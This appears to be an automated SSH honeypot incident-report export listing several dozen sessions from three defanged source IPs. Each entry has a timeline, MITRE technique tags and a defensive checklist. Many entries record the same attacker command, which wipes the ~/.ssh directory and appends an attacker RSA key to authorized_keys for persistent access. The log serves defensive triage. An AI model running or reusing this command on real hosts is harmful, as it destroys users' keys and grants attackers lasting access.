
| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-14 17:27 |
| **Last Seen** | 2026-06-14 17:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:27:50` | `cowrie.session.connect` |
| `2026-06-14 17:27:50` | `cowrie.client.version` |
| `2026-06-14 17:27:50` | `cowrie.client.kex` |
| `2026-06-14 17:27:51` | `cowrie.login.success` |
| `2026-06-14 17:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40faf3a97f6c

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-14 17:29 |
| **Last Seen** | 2026-06-14 17:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:29:40` | `cowrie.session.connect` |
| `2026-06-14 17:29:40` | `cowrie.client.version` |
| `2026-06-14 17:29:40` | `cowrie.client.kex` |
| `2026-06-14 17:29:40` | `cowrie.login.success` |
| `2026-06-14 17:29:41` | `cowrie.session.params` |
| `2026-06-14 17:29:41` | `cowrie.command.input` |
| `2026-06-14 17:29:41` | `cowrie.command.failed` |
| `2026-06-14 17:29:41` | `cowrie.log.closed` |
| `2026-06-14 17:29:41` | `cowrie.session.params` |
| `2026-06-14 17:29:41` | `cowrie.command.input` |
| `2026-06-14 17:29:41` | `cowrie.session.file_download` |
| `2026-06-14 17:29:41` | `cowrie.log.closed` |
| `2026-06-14 17:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa7e9950262

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-14 17:29 |
| **Last Seen** | 2026-06-14 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:29:43` | `cowrie.session.connect` |
| `2026-06-14 17:29:43` | `cowrie.client.version` |
| `2026-06-14 17:29:43` | `cowrie.client.kex` |
| `2026-06-14 17:29:44` | `cowrie.login.success` |
| `2026-06-14 17:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-677b4a0d4fcb

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:30 |
| **Last Seen** | 2026-06-14 17:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:30:25` | `cowrie.session.connect` |
| `2026-06-14 17:30:25` | `cowrie.client.version` |
| `2026-06-14 17:30:25` | `cowrie.client.kex` |
| `2026-06-14 17:30:26` | `cowrie.login.success` |
| `2026-06-14 17:30:26` | `cowrie.session.params` |
| `2026-06-14 17:30:26` | `cowrie.command.input` |
| `2026-06-14 17:30:26` | `cowrie.command.failed` |
| `2026-06-14 17:30:27` | `cowrie.log.closed` |
| `2026-06-14 17:30:27` | `cowrie.session.params` |
| `2026-06-14 17:30:27` | `cowrie.command.input` |
| `2026-06-14 17:30:27` | `cowrie.session.file_download` |
| `2026-06-14 17:30:27` | `cowrie.log.closed` |
| `2026-06-14 17:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c002f4682d2d

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:30 |
| **Last Seen** | 2026-06-14 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:30:29` | `cowrie.session.connect` |
| `2026-06-14 17:30:29` | `cowrie.client.version` |
| `2026-06-14 17:30:29` | `cowrie.client.kex` |
| `2026-06-14 17:30:30` | `cowrie.login.success` |
| `2026-06-14 17:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc154550abeb

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:32 |
| **Last Seen** | 2026-06-14 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:32:13` | `cowrie.session.connect` |
| `2026-06-14 17:32:13` | `cowrie.client.version` |
| `2026-06-14 17:32:13` | `cowrie.client.kex` |
| `2026-06-14 17:32:14` | `cowrie.login.success` |
| `2026-06-14 17:32:14` | `cowrie.session.params` |
| `2026-06-14 17:32:14` | `cowrie.command.input` |
| `2026-06-14 17:32:14` | `cowrie.command.failed` |
| `2026-06-14 17:32:14` | `cowrie.log.closed` |
| `2026-06-14 17:32:14` | `cowrie.session.params` |
| `2026-06-14 17:32:14` | `cowrie.command.input` |
| `2026-06-14 17:32:15` | `cowrie.session.file_download` |
| `2026-06-14 17:32:15` | `cowrie.log.closed` |
| `2026-06-14 17:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-485e24c2f751

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:32 |
| **Last Seen** | 2026-06-14 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:32:17` | `cowrie.session.connect` |
| `2026-06-14 17:32:17` | `cowrie.client.version` |
| `2026-06-14 17:32:17` | `cowrie.client.kex` |
| `2026-06-14 17:32:17` | `cowrie.login.success` |
| `2026-06-14 17:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8828f33c9b1f

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:35 |
| **Last Seen** | 2026-06-14 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:35:17` | `cowrie.session.connect` |
| `2026-06-14 17:35:17` | `cowrie.client.version` |
| `2026-06-14 17:35:17` | `cowrie.client.kex` |
| `2026-06-14 17:35:18` | `cowrie.login.success` |
| `2026-06-14 17:35:19` | `cowrie.session.params` |
| `2026-06-14 17:35:19` | `cowrie.command.input` |
| `2026-06-14 17:35:19` | `cowrie.command.failed` |
| `2026-06-14 17:35:19` | `cowrie.log.closed` |
| `2026-06-14 17:35:19` | `cowrie.session.params` |
| `2026-06-14 17:35:19` | `cowrie.command.input` |
| `2026-06-14 17:35:20` | `cowrie.session.file_download` |
| `2026-06-14 17:35:20` | `cowrie.log.closed` |
| `2026-06-14 17:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18dc9d79ef9

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:35 |
| **Last Seen** | 2026-06-14 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:35:23` | `cowrie.session.connect` |
| `2026-06-14 17:35:23` | `cowrie.client.version` |
| `2026-06-14 17:35:23` | `cowrie.client.kex` |
| `2026-06-14 17:35:24` | `cowrie.login.success` |
| `2026-06-14 17:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-248aa91fbfc4

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:36 |
| **Last Seen** | 2026-06-14 17:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:36:39` | `cowrie.session.connect` |
| `2026-06-14 17:36:39` | `cowrie.client.version` |
| `2026-06-14 17:36:39` | `cowrie.client.kex` |
| `2026-06-14 17:36:40` | `cowrie.login.success` |
| `2026-06-14 17:36:40` | `cowrie.session.params` |
| `2026-06-14 17:36:40` | `cowrie.command.input` |
| `2026-06-14 17:36:40` | `cowrie.command.failed` |
| `2026-06-14 17:36:41` | `cowrie.log.closed` |
| `2026-06-14 17:36:41` | `cowrie.session.params` |
| `2026-06-14 17:36:41` | `cowrie.command.input` |
| `2026-06-14 17:36:41` | `cowrie.session.file_download` |
| `2026-06-14 17:36:41` | `cowrie.log.closed` |
| `2026-06-14 17:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf968517ddb

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:36 |
| **Last Seen** | 2026-06-14 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:36:44` | `cowrie.session.connect` |
| `2026-06-14 17:36:44` | `cowrie.client.version` |
| `2026-06-14 17:36:45` | `cowrie.client.kex` |
| `2026-06-14 17:36:46` | `cowrie.login.success` |
| `2026-06-14 17:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c3d71be56e

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:37 |
| **Last Seen** | 2026-06-14 17:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:37:20` | `cowrie.session.connect` |
| `2026-06-14 17:37:20` | `cowrie.client.version` |
| `2026-06-14 17:37:20` | `cowrie.client.kex` |
| `2026-06-14 17:37:20` | `cowrie.login.success` |
| `2026-06-14 17:37:21` | `cowrie.session.params` |
| `2026-06-14 17:37:21` | `cowrie.command.input` |
| `2026-06-14 17:37:21` | `cowrie.command.failed` |
| `2026-06-14 17:37:21` | `cowrie.log.closed` |
| `2026-06-14 17:37:21` | `cowrie.session.params` |
| `2026-06-14 17:37:21` | `cowrie.command.input` |
| `2026-06-14 17:37:21` | `cowrie.session.file_download` |
| `2026-06-14 17:37:21` | `cowrie.log.closed` |
| `2026-06-14 17:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2b6623d6ba

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:37 |
| **Last Seen** | 2026-06-14 17:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:37:23` | `cowrie.session.connect` |
| `2026-06-14 17:37:23` | `cowrie.client.version` |
| `2026-06-14 17:37:23` | `cowrie.client.kex` |
| `2026-06-14 17:37:24` | `cowrie.login.success` |
| `2026-06-14 17:37:25` | `cowrie.session.params` |
| `2026-06-14 17:37:25` | `cowrie.command.input` |
| `2026-06-14 17:37:25` | `cowrie.command.failed` |
| `2026-06-14 17:37:25` | `cowrie.log.closed` |
| `2026-06-14 17:37:26` | `cowrie.session.params` |
| `2026-06-14 17:37:26` | `cowrie.command.input` |
| `2026-06-14 17:37:26` | `cowrie.session.file_download` |
| `2026-06-14 17:37:26` | `cowrie.log.closed` |
| `2026-06-14 17:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9b0cad83c9

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:37 |
| **Last Seen** | 2026-06-14 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:37:23` | `cowrie.session.connect` |
| `2026-06-14 17:37:23` | `cowrie.client.version` |
| `2026-06-14 17:37:23` | `cowrie.client.kex` |
| `2026-06-14 17:37:24` | `cowrie.login.success` |
| `2026-06-14 17:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f1c2c3a631

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:37 |
| **Last Seen** | 2026-06-14 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:37:29` | `cowrie.session.connect` |
| `2026-06-14 17:37:29` | `cowrie.client.version` |
| `2026-06-14 17:37:29` | `cowrie.client.kex` |
| `2026-06-14 17:37:30` | `cowrie.login.success` |
| `2026-06-14 17:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43b411845fc5

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:38 |
| **Last Seen** | 2026-06-14 17:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:38:48` | `cowrie.session.connect` |
| `2026-06-14 17:38:48` | `cowrie.client.version` |
| `2026-06-14 17:38:49` | `cowrie.client.kex` |
| `2026-06-14 17:38:50` | `cowrie.login.success` |
| `2026-06-14 17:38:50` | `cowrie.session.params` |
| `2026-06-14 17:38:50` | `cowrie.command.input` |
| `2026-06-14 17:38:50` | `cowrie.command.failed` |
| `2026-06-14 17:38:50` | `cowrie.log.closed` |
| `2026-06-14 17:38:51` | `cowrie.session.params` |
| `2026-06-14 17:38:51` | `cowrie.command.input` |
| `2026-06-14 17:38:51` | `cowrie.session.file_download` |
| `2026-06-14 17:38:51` | `cowrie.log.closed` |
| `2026-06-14 17:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48969f39b681

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:38 |
| **Last Seen** | 2026-06-14 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:38:54` | `cowrie.session.connect` |
| `2026-06-14 17:38:54` | `cowrie.client.version` |
| `2026-06-14 17:38:54` | `cowrie.client.kex` |
| `2026-06-14 17:38:55` | `cowrie.login.success` |
| `2026-06-14 17:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2200ddc25b

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-06-14 17:40 |
| **Last Seen** | 2026-06-14 17:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
